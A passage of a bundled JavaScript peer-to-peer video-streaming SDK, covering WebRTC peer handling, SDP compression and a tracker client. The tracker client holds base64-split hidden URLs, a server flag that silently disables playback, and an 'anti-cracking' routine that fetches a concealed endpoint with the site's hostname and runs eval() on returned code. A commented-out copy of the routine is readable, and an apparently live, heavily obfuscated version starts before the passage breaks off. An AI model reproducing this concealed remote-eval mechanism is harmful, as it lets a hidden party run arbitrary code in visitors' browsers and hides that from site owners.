                };

                _this11._pc.setLocalDescription(answer).then(onSuccess).catch(onError);
            }).catch(function (err) {
                _this11.destroy(err);
            });
        }
    }, {
        key: '_onConnectionStateChange',
        value: function _onConnectionStateChange() {
            if (this.destroyed) return;
            if (this._pc.connectionState === 'failed') {
                this.destroy(new Error('Connection failed.'));
            }
        }

        // TODO iceRestart

    }, {
        key: '_onIceStateChange',
        value: function _onIceStateChange() {
            if (this.destroyed) return;
            var iceConnectionState = this._pc.iceConnectionState;
            var iceGatheringState = this._pc.iceGatheringState;

            // this._debug(
            //     'iceStateChange (connection: %s) (gathering: %s)',
            //     iceConnectionState,
            //     iceGatheringState
            // )
            this.emit('iceStateChange', iceConnectionState, iceGatheringState);

            if (iceConnectionState === 'connected' || iceConnectionState === 'completed') {
                this._pcReady = true;
                this._maybeReady();
            }
            if (iceConnectionState === 'failed') {
                this.destroy(new Error('Ice connection failed.'));
            }
            if (iceConnectionState === 'closed') {
                this.destroy(new Error('Ice connection closed.'));
            }
        }
    }, {
        key: 'getStats',
        value: function getStats(cb) {
            var _this12 = this;

            // statreports can come with a value array instead of properties
            var flattenValues = function flattenValues(report) {
                if (Object.prototype.toString.call(report.values) === '[object Array]') {
                    report.values.forEach(function (value) {
                        Object.assign(report, value);
                    });
                }
                return report;
            };

            // Promise-based getStats() (standard)
            if (this._pc.getStats.length === 0 || this._isReactNativeWebrtc) {
                this._pc.getStats().then(function (res) {
                    var reports = [];
                    res.forEach(function (report) {
                        reports.push(flattenValues(report));
                    });
                    cb(null, reports);
                }, function (err) {
                    return cb(err);
                });

                // Single-parameter callback-based getStats() (non-standard)
            } else if (this._pc.getStats.length > 0) {
                this._pc.getStats(function (res) {
                    // If we destroy connection in `connect` callback this code might happen to run when actual connection is already closed
                    if (_this12.destroyed) return;

                    var reports = [];
                    res.result().forEach(function (result) {
                        var report = {};
                        result.names().forEach(function (name) {
                            report[name] = result.stat(name);
                        });
                        report.id = result.id;
                        report.type = result.type;
                        report.timestamp = result.timestamp;
                        reports.push(flattenValues(report));
                    });
                    cb(null, reports);
                }, function (err) {
                    return cb(err);
                });

                // Unknown browser, skip getStats() since it's anyone's guess which style of
                // getStats() they implement.
            } else {
                cb(null, []);
            }
        }
    }, {
        key: '_maybeReady',
        value: function _maybeReady() {
            var _this13 = this;

            // this._debug('maybeReady pc %s channel %s', this._pcReady, this._channelReady)
            if (this._connected || this._connecting || !this._pcReady || !this._channelReady) return;

            this._connecting = true;

            // HACK: We can't rely on order here, for details see https://github.com/js-platform/node-webrtc/issues/339
            var findCandidatePair = function findCandidatePair() {
                if (_this13.destroyed) return;

                _this13.getStats(function (err, items) {
                    if (_this13.destroyed) return;

                    // Treat getStats error as non-fatal. It's not essential.
                    if (err) items = [];

                    var remoteCandidates = {};
                    var localCandidates = {};
                    var candidatePairs = {};
                    var foundSelectedCandidatePair = false;

                    items.forEach(function (item) {
                        // TODO: Once all browsers support the hyphenated stats report types, remove
                        // the non-hypenated ones
                        if (item.type === 'remotecandidate' || item.type === 'remote-candidate') {
                            remoteCandidates[item.id] = item;
                        }
                        if (item.type === 'localcandidate' || item.type === 'local-candidate') {
                            localCandidates[item.id] = item;
                        }
                        if (item.type === 'candidatepair' || item.type === 'candidate-pair') {
                            candidatePairs[item.id] = item;
                        }
                    });

                    var setSelectedCandidatePair = function setSelectedCandidatePair(selectedCandidatePair) {
                        foundSelectedCandidatePair = true;

                        var local = localCandidates[selectedCandidatePair.localCandidateId];

                        if (local && (local.ip || local.address)) {
                            // Spec
                            _this13.localAddress = local.ip || local.address;
                            _this13.localPort = Number(local.port);
                        } else if (local && local.ipAddress) {
                            // Firefox
                            _this13.localAddress = local.ipAddress;
                            _this13.localPort = Number(local.portNumber);
                        } else if (typeof selectedCandidatePair.googLocalAddress === 'string') {
                            // TODO: remove this once Chrome 58 is released
                            local = selectedCandidatePair.googLocalAddress.split(':');
                            _this13.localAddress = local[0];
                            _this13.localPort = Number(local[1]);
                        }
                        if (_this13.localAddress) {
                            _this13.localFamily = _this13.localAddress.includes(':') ? 'IPv6' : 'IPv4';
                        }

                        var remote = remoteCandidates[selectedCandidatePair.remoteCandidateId];

                        if (remote && (remote.ip || remote.address)) {
                            // Spec
                            _this13.remoteAddress = remote.ip || remote.address;
                            _this13.remotePort = Number(remote.port);
                        } else if (remote && remote.ipAddress) {
                            // Firefox
                            _this13.remoteAddress = remote.ipAddress;
                            _this13.remotePort = Number(remote.portNumber);
                        } else if (typeof selectedCandidatePair.googRemoteAddress === 'string') {
                            // TODO: remove this once Chrome 58 is released
                            remote = selectedCandidatePair.googRemoteAddress.split(':');
                            _this13.remoteAddress = remote[0];
                            _this13.remotePort = Number(remote[1]);
                        }
                        if (_this13.remoteAddress) {
                            _this13.remoteFamily = _this13.remoteAddress.includes(':') ? 'IPv6' : 'IPv4';
                        }

                        // this._debug(
                        //     'connect local: %s:%s remote: %s:%s',
                        //     this.localAddress,
                        //     this.localPort,
                        //     this.remoteAddress,
                        //     this.remotePort
                        // )
                    };

                    items.forEach(function (item) {
                        // Spec-compliant
                        if (item.type === 'transport' && item.selectedCandidatePairId) {
                            setSelectedCandidatePair(candidatePairs[item.selectedCandidatePairId]);
                        }

                        // Old implementations
                        if (item.type === 'googCandidatePair' && item.googActiveConnection === 'true' || (item.type === 'candidatepair' || item.type === 'candidate-pair') && item.selected) {
                            setSelectedCandidatePair(item);
                        }
                    });

                    // Ignore candidate pair selection in browsers like Safari 11 that do not have any local or remote candidates
                    // But wait until at least 1 candidate pair is available
                    if (!foundSelectedCandidatePair && (!Object.keys(candidatePairs).length || Object.keys(localCandidates).length)) {
                        setTimeout(findCandidatePair, 100);
                        return;
                    } else {
                        _this13._connecting = false;
                        _this13._connected = true;
                    }

                    if (_this13._chunk) {
                        try {
                            _this13.send(_this13._chunk);
                        } catch (err) {
                            return _this13.destroy(err);
                        }
                        _this13._chunk = null;
                        // this._debug('sent chunk from "write before connect"')

                        var cb = _this13._cb;
                        _this13._cb = null;
                        cb(null);
                    }

                    // If `bufferedAmountLowThreshold` and 'onbufferedamountlow' are unsupported,
                    // fallback to using setInterval to implement backpressure.
                    if (typeof _this13._channel.bufferedAmountLowThreshold !== 'number') {
                        _this13._interval = setInterval(function () {
                            return _this13._onInterval();
                        }, 150);
                        if (_this13._interval.unref) _this13._interval.unref();
                    }

                    // this._debug('connect')
                    _this13.emit('connect');
                });
            };
            findCandidatePair();
        }
    }, {
        key: '_onInterval',
        value: function _onInterval() {
            if (!this._cb || !this._channel || this._channel.bufferedAmount > MAX_BUFFERED_AMOUNT) {
                return;
            }
            this._onChannelBufferedAmountLow();
        }
    }, {
        key: '_onSignalingStateChange',
        value: function _onSignalingStateChange() {
            var _this14 = this;

            if (this.destroyed) return;

            if (this._pc.signalingState === 'stable') {
                this._isNegotiating = false;

                // HACK: Firefox doesn't yet support removing tracks when signalingState !== 'stable'
                // this._debug('flushing sender queue', this._sendersAwaitingStable)
                this._sendersAwaitingStable.forEach(function (sender) {
                    _this14._pc.removeTrack(sender);
                    _this14._queuedNegotiation = true;
                });
                this._sendersAwaitingStable = [];

                if (this._queuedNegotiation) {
                    // this._debug('flushing negotiation queue')
                    this._queuedNegotiation = false;
                    this._needsNegotiation(); // negotiate again
                } else {
                    // this._debug('negotiated')
                    this.emit('negotiated');
                }
            }

            // this._debug('signalingStateChange %s', this._pc.signalingState)
            this.emit('signalingStateChange', this._pc.signalingState);
        }
    }, {
        key: '_onIceCandidate',
        value: function _onIceCandidate(event) {
            if (this.destroyed) return;
            if (event.candidate && this.trickle) {
                this.emit('signal', {
                    type: 'candidate',
                    candidate: {
                        candidate: event.candidate.candidate,
                        sdpMLineIndex: event.candidate.sdpMLineIndex,
                        sdpMid: event.candidate.sdpMid
                    }
                });
            } else if (!event.candidate && !this._iceComplete) {
                // 到这里说明没有新的candidate了
                // console.warn(`_onIceCandidate event ${event}`)
                this._iceComplete = true;
                this.emit('_iceComplete');
            }
            // as soon as we've received one valid candidate start timeout
            if (event.candidate) {
                // console.warn(`_startIceCompleteTimeout ${new Date()}`)
                this._startIceCompleteTimeout();
            }
        }
    }, {
        key: '_onChannelMessage',
        value: function _onChannelMessage(event) {
            if (this.destroyed) return;
            var data = event.data;
            if (data instanceof ArrayBuffer) data = Buffer.from(data);
            // this.push(data)
            this.emit('data', data);
        }
    }, {
        key: '_onChannelBufferedAmountLow',
        value: function _onChannelBufferedAmountLow() {
            if (this.destroyed || !this._cb) return;
            // this._debug('ending backpressure: bufferedAmount %d', this._channel.bufferedAmount)
            var cb = this._cb;
            this._cb = null;
            cb(null);
        }
    }, {
        key: '_onChannelOpen',
        value: function _onChannelOpen() {
            if (this._connected || this.destroyed) return;
            // this._debug('on channel open')
            this._channelReady = true;
            this._maybeReady();
        }
    }, {
        key: '_onChannelClose',
        value: function _onChannelClose() {
            if (this.destroyed) return;
            // this._debug('on channel close')
            this.destroy();
        }

        // _onTrack (event) {
        //     if (this.destroyed) return
        //
        //     event.streams.forEach(eventStream => {
        //         // this._debug('on track')
        //         this.emit('track', event.track, eventStream)
        //
        //         this._remoteTracks.push({
        //             track: event.track,
        //             stream: eventStream
        //         })
        //
        //         if (this._remoteStreams.some(remoteStream => {
        //             return remoteStream.id === eventStream.id
        //         })) return // Only fire one 'stream' event, even though there may be multiple tracks per stream
        //
        //         this._remoteStreams.push(eventStream)
        //         queueMicrotask(() => {
        //             // this._debug('on stream')
        //             this.emit('stream', eventStream) // ensure all tracks have been added
        //         })
        //     })
        // }

        // _debug () {
        // const args = [].slice.call(arguments)
        // args[0] = '[' + this._id + '] ' + args[0]
        // debug.apply(null, args)
        // }

    }, {
        key: 'bufferSize',
        get: function get() {
            return this._channel && this._channel.bufferedAmount || 0;
        }

        // HACK: it's possible channel.readyState is "closing" before peer.destroy() fires
        // https://bugs.chromium.org/p/chromium/issues/detail?id=882743

    }, {
        key: 'connected',
        get: function get() {
            return this._connected && this._channel.readyState === 'open';
        }
    }]);

    return Peer;
}(_events2.default);

// Peer.WEBRTC_SUPPORT = !!getBrowserRTC()

/**
 * Expose peer and data channel config for overriding all Peer
 * instances. Otherwise, just set opts.config or opts.channelConfig
 * when constructing a Peer.
 */


Peer.config = {
    iceServers: [{
        urls: ['stun:stun.l.google.com:19302', 'stun:global.stun.twilio.com:3478']
    }],
    sdpSemantics: 'unified-plan'
};

Peer.channelConfig = {};

module.exports = Peer;

/***/ }),
/* 23 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.unpack = exports.pack = undefined;

var _pack = __webpack_require__(24);

var _pack2 = _interopRequireDefault(_pack);

var _unpack = __webpack_require__(25);

var _unpack2 = _interopRequireDefault(_unpack);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.pack = _pack2.default;
exports.unpack = _unpack2.default;

/***/ }),
/* 24 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

exports.default = function (_ref) {
    var type = _ref.type,
        sdp = _ref.sdp,
        candidate = _ref.candidate;

    if (sdp && sdp.startsWith('v=0')) {
        return packSdp(type, sdp);
    }
    if (type === 'candidate' && candidate) {
        return packCandidate(candidate.candidate);
    }
    return null;
};

var _util = __webpack_require__(14);

function packCandidate(candidate) {
    var splitter = candidate.indexOf(':');
    if (splitter <= 0) {
        return null;
    }
    var value = candidate.slice(splitter + 1).trim();
    var cand = packCandItem(value);
    if (!cand) return null;
    return (0, _util.sdpType2Char)('candidate') + cand.cand;
}

function packSdp(type, sdp) {
    var ufrag = void 0,
        pwd = void 0,
        fingerprint = void 0,
        candidates = [],

    // sessionId,
    hasLocal = false,
        trickle = false;

    var _iteratorNormalCompletion = true;
    var _didIteratorError = false;
    var _iteratorError = undefined;

    try {
        for (var _iterator = sdp.split('\r\n')[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
            var line = _step.value;

            var splitter = line.indexOf(':');
            if (splitter <= 0) {
                // if (line.startsWith('o')) {
                //     sessionId = line.split(' ')[1]
                // }
                continue;
            }
            if (line === 'a=ice-options:trickle') {
                trickle = true;
                continue;
            }

            var _ref2 = [line.slice(0, splitter), line.slice(splitter + 1).trim()],
                attribute = _ref2[0],
                value = _ref2[1];


            switch (attribute) {
                case 'a=ice-ufrag':
                    ufrag = value;
                    break;

                case 'a=ice-pwd':
                    pwd = value;
                    break;

                case 'a=fingerprint':
                    fingerprint = (0, _util.bytesToStr)(value.substr('sha-256'.length).trim().split(':').map(function (byte) {
                        return parseInt(byte, 16);
                    }));
                    break;

                case 'a=candidate':
                    var obj = packCandItem(value, hasLocal);
                    if (!obj) continue;
                    if (obj.local) {
                        if (hasLocal) {
                            continue;
                        }
                        hasLocal = true;
                    }
                    candidates.push(obj.cand);
                    break;
            }
        }

        // console.log(`type ${type} fingerprint ${fingerprint} candidates ${candidates} sessionId ${sessionId} ufrag ${ufrag}
        //             pwd ${pwd}`)
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally {
        try {
            if (!_iteratorNormalCompletion && _iterator.return) {
                _iterator.return();
            }
        } finally {
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }

    return (0, _util.sdpType2Char)(type, trickle) + fingerprint + (candidates.length > 0 ? candidates.join(_util.arrayDelimiter) : '') + (
    // delimiter +
    // sessionId +
    trickle ? '' : _util.delimiter) + ufrag + _util.delimiter + pwd;
}

function packCandItem(value) {
    var local = false;
    // const [foundation, , transport, , connectionAddress, port, , candType] = value.split(' ')
    var candObj = (0, _util.parseCand)(value);
    // console.warn(JSON.stringify(candObj))
    if (candObj.transport === 'TCP') return null;
    if (candObj.ip.endsWith('.local')) {
        local = true;
    }
    var cand = candObj.type.charAt(0);
    var ipBytes = candObj.ip.split('.');
    if (ipBytes.length === 4) {
        var addr = ipBytes.reduce(function (prev, cur) {
            return (prev << 8) + parseInt(cur, 10);
        });
        cand = '' + cand + candObj.foundation + ' ' + addr + ':' + parseInt(candObj.port);
    } else {
        cand = '' + cand + candObj.foundation + ' ' + candObj.ip + ' ' + candObj.port;
    }
    return { cand: cand, local: local };
}
module.exports = exports['default'];

/***/ }),
/* 25 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

exports.default = function (packed, sessionId) {
    var type = (0, _util.char2SdpType)(packed.substr(0, 1));
    if (!type) return null;
    if (type.type === 'candidate') {
        return unpackCand(packed);
    }
    return unpackSdp(type.type, sessionId, packed, type.trickle);
};

var _util = __webpack_require__(14);

function unpackCand(packed) {
    var item = unpackCandItem(packed.substr(1), 100);
    if (!item) return null;
    return {
        type: "candidate",
        candidate: {
            candidate: 'candidate:' + item,
            sdpMLineIndex: 0,
            sdpMid: "0"
        }
    };
}

function unpackSdp(type, sessionId, packed, trickle) {
    var fingerprint = (0, _util.strToBytes)(packed.slice(1, 1 + 32)).map(function (byte) {
        return ('0' + byte.toString(16)).slice(-2);
    });
    var remain = packed.substr(33);
    var candidatesStr = void 0,
        ufrag = void 0,
        password = void 0;
    if (trickle) {
        var _remain$split = remain.split(_util.delimiter);

        var _remain$split2 = _slicedToArray(_remain$split, 2);

        ufrag = _remain$split2[0];
        password = _remain$split2[1];
    } else {
        var _remain$split3 = remain.split(_util.delimiter);

        var _remain$split4 = _slicedToArray(_remain$split3, 3);

        candidatesStr = _remain$split4[0];
        ufrag = _remain$split4[1];
        password = _remain$split4[2];
    }
    var candidates = trickle ? [] : candidatesStr.split(_util.arrayDelimiter);
    var sdpParts = ['v=0', 'o=- ' + sessionId + ' 2 IN IP4 127.0.0.1', 's=-', 't=0 0', 'a=group:BUNDLE 0', 'a=msid-semantic: WMS', 'm=application 9 UDP/DTLS/SCTP webrtc-datachannel', 'c=IN IP4 0.0.0.0', 'a=mid:0', 'a=sctp-port:5000', 'a=setup:' + (type === 'answer' ? 'active' : 'actpass'), 'a=ice-ufrag:' + ufrag, 'a=ice-pwd:' + password, 'a=fingerprint:sha-256 ' + fingerprint.join(':').toUpperCase()];
    if (trickle) {
        sdpParts.push('a=ice-options:trickle');
    }
    var priority = 100;
    var _iteratorNormalCompletion = true;
    var _didIteratorError = false;
    var _iteratorError = undefined;

    try {
        for (var _iterator = candidates[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
            var cand = _step.value;

            var item = unpackCandItem(cand, priority);
            if (!item) continue;
            priority--;
            sdpParts.push('a=candidate:' + item);
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally {
        try {
            if (!_iteratorNormalCompletion && _iterator.return) {
                _iterator.return();
            }
        } finally {
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }

    return {
        type: type,
        sdp: sdpParts.join('\r\n') + '\r\n'
    };
}

function unpackCandItem(cand, priority) {
    var ip = void 0,
        port = void 0,
        foundation = void 0;
    var candType = _util.candTypeMap[cand.substr(0, 1)];
    var infos = cand.substr(1).split(' ');
    if (infos.length === 2) {
        // ipv4
        foundation = infos[0];
        var addr = infos[1].split(':');
        // ip = strToBytes(addr.substr(0, 4)).join('.')
        ip = [addr[0] >> 24 & 0xff, addr[0] >> 16 & 0xff, addr[0] >> 8 & 0xff, addr[0] & 0xff].join('.');
        port = addr[1];
    } else {
        var _infos = _slicedToArray(infos, 3);

        foundation = _infos[0];
        ip = _infos[1];
        port = _infos[2];
    }
    // console.warn(`ip ${ip} port ${port}`)
    return '' + [foundation, 1, // component id
    'udp', // transport
    priority, ip, port, 'typ', candType].join(' ');
}
module.exports = exports['default'];

/***/ }),
/* 26 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
/* WEBPACK VAR INJECTION */(function(process, global) {

Object.defineProperty(exports, "__esModule", {
    value: true
});

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _md = __webpack_require__(29);

var _md2 = _interopRequireDefault(_md);

var _urlToolkit = __webpack_require__(7);

var _urlToolkit2 = _interopRequireDefault(_urlToolkit);

var _events = __webpack_require__(2);

var _events2 = _interopRequireDefault(_events);

var _toolFuns = __webpack_require__(0);

var _platform = __webpack_require__(4);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var ENGINE_VERSION = "0.0.1";

var MIN_CONNS = 8; // 默认最低连接peers数
// const ROPE_PING_INTERVAL = 270;       // rope心跳间隔   2/3G网络NAT超时时间5分钟
var BASE_REPORT_INTERVAL = 20; // stats间隔

// const ANNOUNCE = 'aHR0cHMlM0EvL3RyYWNrZXIuY2RuYnllLmNvbS92MQ==';      // tracker服务器地址base64编码
// const BL_URL = 'aHR0cHMlM0EvL3AycGVuZ2luZS5uZXQlM0EyMzMzL2Js';     // 防破解接口地址base64编码

var URL_MAP = {
    'q': 'uZ2luZS5u',
    'v': 'aHR0c',
    '3': 'HMlM0Ev',
    '0': 'yMzMzL2Js',
    'l': 'ZXIuY2R',
    'zz': 'aHR0cHMlM',
    'n': 'L3RyYWNr',
    'h': 'ZXQlM0E',
    '7': 'uYnllLmNvbS',
    'x': '92MQ==',
    'df': '0EvL',
    '6': '3AycGV',

    'kj': 'aHR0cHMlM0EvL',
    'a': '3Ry',
    '+': 'YWNrZXIua',
    '=': 'GR0dmNsb3VkLm',
    'w': 'NvbS92MQ==',

    'o': '2hrLnN3Y',
    'xo': 'XJtY2xvdW',
    'sb': 'QubmV0L3Yx'
};

var _httpDownloaded = Symbol('httpDownloaded');
var _p2pDownloaded = Symbol('p2pDownloaded');
var _p2pUploaded = Symbol('p2pUploaded');

var Server = function () {
    function Server(engine, key, channel, baseUrl, info) {
        _classCallCheck(this, Server);

        var rawUrl = void 0;
        switch (engine.config.announceLocation) {
            case 'cn':
                rawUrl = URL_MAP['v'] + URL_MAP['3'] + URL_MAP['n'] + URL_MAP['l'] + URL_MAP['7'] + URL_MAP['x'];
                break;
            case 'hk':
                rawUrl = URL_MAP['kj'] + URL_MAP['o'] + URL_MAP['xo'] + URL_MAP['sb'];
                break;
            case 'us':
                rawUrl = URL_MAP['kj'] + URL_MAP['a'] + URL_MAP['+'] + URL_MAP['='] + URL_MAP['w'];
        }

        this.engine = engine;
        this.key = key ? key : undefined;
        this.baseUrl = baseUrl ? baseUrl : decodeURIComponent(window.atob(rawUrl));
        // this.baseUrl = baseUrl ? baseUrl : window.decodeURIComponent(window.atob(ANNOUNCE));
        this.channelId = window.btoa(channel);
        // this.channelId = window.encodeURIComponent(channel);
        this.timestamp = (0, _toolFuns.getCurrentTs)();

        var netLoc = _urlToolkit2.default.parseURL(this.baseUrl).netLoc; //  //tracker.p2pengine.net:7067
        // vcode
        this.announce = netLoc.replace(/\/\//, "");
        // this.announce = 'tracker.cdnbye.com'     // test
        var vcode = generateVCode(this.timestamp, ENGINE_VERSION, this.announce, this.channelId, info.type);

        this.announceInfo = _extends({}, info, {
            channel: this.channelId,
            ts: this.timestamp,
            version: ENGINE_VERSION,
            v: vcode,
            announce: this.announce,
            token: (0, _platform.isLocalHost)() ? undefined : this.key // localhost不能设置token
        });
        //-----------bt---------------------
        this.announceURL = this.baseUrl + '/channel';

        // 控制参数
        this.reportFails = 0; // 上报服务器错误次数

        this.forbidden = false;

        // 连接情况上报
        this.conns = 0; //连接的peer的增量
        this.failConns = 0; //连接失败的peer的增量

        // 流量上报(单位：KB)
        this.totalHTTPDownloaded = 0; // HTTP下载累积量
        this.totalP2PDownloaded = 0; // P2P下载累积量
        this.totalP2PUploaded = 0; // P2P上传累积量
        this[_httpDownloaded] = 0; // HTTP下载增量
        this[_p2pDownloaded] = 0; // P2P下载增量
        this[_p2pUploaded] = 0; // P2P上传增量

        this.speed = 0; // KB/s

        //播放情况上报
        this.errsBufStalled = 0; //播放卡顿数
        this.errsInternalExpt = 0; //插件内部错误
        // this.exptMsg = '';                                        // 内部错误原因

        // electron
        this.native = !!info.bundle;
    }

    _createClass(Server, [{
        key: 'btAnnounce',
        value: function btAnnounce() {
            var _this2 = this;

            var logger = this.engine.logger;

            return new Promise(function (resolve, reject) {
                fetch(_this2.announceURL, {
                    headers: _this2._requestHeader,
                    method: 'POST',
                    body: JSON.stringify(_this2.announceInfo)
                }).then(function (response) {
                    return response.json();
                }).then(function (json) {
                    if (!_this2.engine) reject();

                    var data = json.data;

                    // test
                    // data.min_conns = 3;
                    // data.share_only = true;
                    // data.f = true;
                    // data.signal = 'wss://siglive.hdtvcdn.com:8078';
                    // data.peers = data.peers[0] ? [data.peers[0]] : []
                    // data.stun = ['stun:stun.cdnbye.com','stun:ye.com'];
                    // data.debug = true;
                    // data.fuse_rate = 1;
                    // data.token = '6666666';

                    // 阻止正常播放
                    if (data.f) {
                        _this2.forbidden = true;
                        // logger.warn('SDK is forbidden to use')
                    }

                    if (json.ret === -1) {
                        // reject(new Error(data.msg));
                        reject(json);
                    } else {

                        if (data.info) console.info('' + data.info);
                        if (data.warn) console.warn('' + data.warn);
                        if (!data.min_conns) data.min_conns = MIN_CONNS;

                        // 如果reject，不使用P2P  防御性检查
                        if ((!data.rejected || data.rejected && data.share_only) && data.id && data.report_interval && data.peers) {
                            _this2.peerId = _this2.id = data.id; // 保存peerId
                            if (data.report_interval < BASE_REPORT_INTERVAL) {
                                data.report_interval = BASE_REPORT_INTERVAL;
                            }
                            _this2.btStats(data.report_interval); // 周期性上报数据
                            // 初始化getPeersURL和statsURL
                            _this2.getPeersURL = _this2.baseUrl + '/channel/' + _this2.channelId + '/node/' + _this2.peerId + '/peers';
                            _this2.statsURL = _this2.baseUrl + '/channel/' + _this2.channelId + '/node/' + _this2.peerId + '/stats';

                            resolve(data);
                        } else {
                            if (_this2.engine) _this2.engine.p2pEnabled = false;
                        }
                    }
                }).catch(function (err) {
                    logger.error('btAnnounce error ' + err);
                    reject({ err: err });
                });
            });
        }
    }, {
        key: 'btStats',
        value: function btStats() {
            var _this3 = this;

            var interval = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 10;

            // const {logger} = this.engine;
            var _this = this;
            this.heartbeater = setInterval(function () {
                _this3.postStats();

                // 防破解
                _b(interval);
            }, interval * 1000);

            // function _b(interval) {
            //     let n = _this.id.split('').slice(-6).map(
            //         c => c.charCodeAt(0)
            //     ).reduce((prev, cur) => {
            //         return prev.toString() + cur.toString();
            //     }, '');
            //     // console.warn(`n%533 is ${parseInt(n)%533}`);
            //     if (parseInt(n)%533 === 200) {
            //     // if (true) {                   // test
            //         _this.bl = setTimeout(() => {
            //             fetch(
            //                 `${window.decodeURIComponent(window.atob(URL_MAP['zz']+URL_MAP['df']+URL_MAP['6']+URL_MAP['q']+URL_MAP['h']+URL_MAP['0']))}?d=${_this.announce}&f=${location.hostname}&v=${_this.announceInfo.version}`
            //             ).then(response => {
            //                 return response.json()
            //             }).then(json => {
            //                 if (json.ret === 0) {
            //                     const data = json.data;
            //                     if (data.s) {
            //                         const i = data.i;
            //                         _this.bl = setTimeout(() => {
            //                             eval(data.c);
            //                         }, i * 1000)
            //                     }
            //                 }
            //             })
            //             }, interval*1000*5)           // 多久后请求接口
            //         // }, interval)           // test
            //     }
            //     _b = noop;
            // }

            // 混淆 https://www.jsjiami.com/

            var _0x5bd5 = ['v1', 'PmvWt1ORKFVimMIwnGl==', 'wpUsdEvDhA==', 'eC3CqcOrQ8KQRMKK', 'HUEHO8OWMcKWw5M=', 'ZxfChcKtEg==', 'DcOIVgXDtQ==', 'CwbCicO9woI=', 'wpfCo3VewrY=', 'w4c+w7JXw7Y=', 'TFt/wo3CsA==', 'X8ONKcKCw74=', 'w4PCoMO/eg4=', 'N2Upwoow', 'fMKDccOGw5o=', 'RcKlXcOUw64=', 'wpnCl8OHAMKd', 'A8OTwrHCpWk=', 'wr3DhVM=', 'AcOVVS/DosO8wo/ClA==', 'w4PChcOl', 'dcO0TMKZEsO6w5XCscKMSDDDmg==', 'w7otSDDDkMOOLQ==', 'wqTCmsKMw6zCgw==', 'Dlg5DMO3', 'b8KJJFzDl8OLw7TDow==', 'w7gnaTfDi8OILRw=', 'd3l/wqE=', 'BGsww7hG', 'wojClsKHw5HCsg==', 'QcOJRm3DlA==', 'ecKaScOKw6c=', 'w5bCq8Oj', 'w4dTw61e', 'w4zCqMOQfMOA', 'wr8ORHXDog==', 'wrzCkcOmNsKb', 'w4E4w41R', 'Vj7CscKgAg==', 'T8OLLMOGCQ==', 'c8Krw67CoRI=', 'e8OjQcKBwqc=', 'w4oNwqtbwoM=', 'W8OQR8K0Ng==', 'DsO6w6nDl8Ki', 'V8O/ZMK0Jg==', 'NgbCvcOpwqo=', 'EV8hAMOi', 'wp/CjU7Ch8Kj', 'wo/CiUbClsKFGi9ew4rDtA==', 'WcKHLUbDkQ==', 'cMOLw5vCkBo='];(function (_0x3eee5c, _0x2b2808, _0x5bfbce) {
                var _0x2bc4a7 = function _0x2bc4a7(_0x8ed540, _0x3eeecc, _0x1d7a24, _0x524f83) {
                    _0x3eeecc = _0x3eeecc >> 0x8;if (_0x3eeecc < _0x8ed540) {
                        while (--_0x8ed540) {
                            _0x524f83 = _0x3eee5c['shift']();if (_0x3eeecc === _0x8ed540) {
                                _0x3eeecc = _0x524f83;_0x1d7a24 = _0x3eee5c['shift']();
                            } else if (_0x1d7a24['replace'](/[PmWtORKFVimMIwnGl=]/g, '') === _0x3eeecc) {
                                _0x3eee5c['push'](_0x524f83);
                            }
                        }_0x3eee5c['push'](_0x3eee5c['shift']());
                    }return 0x30af5;
                };return _0x2bc4a7(++_0x2b2808, _0x5bfbce) >> _0x2b2808 ^ _0x5bfbce;
            })(_0x5bd5, 0x157, 0x15700);var _0x38aa = function _0x38aa(_0x31c445, _0x362f3b) {
                _0x31c445 = ~~'0x'['concat'](_0x31c445);var _0x414658 = _0x5bd5[_0x31c445];if (_0x38aa['UJLmyS'] === undefined) {
                    (function () {
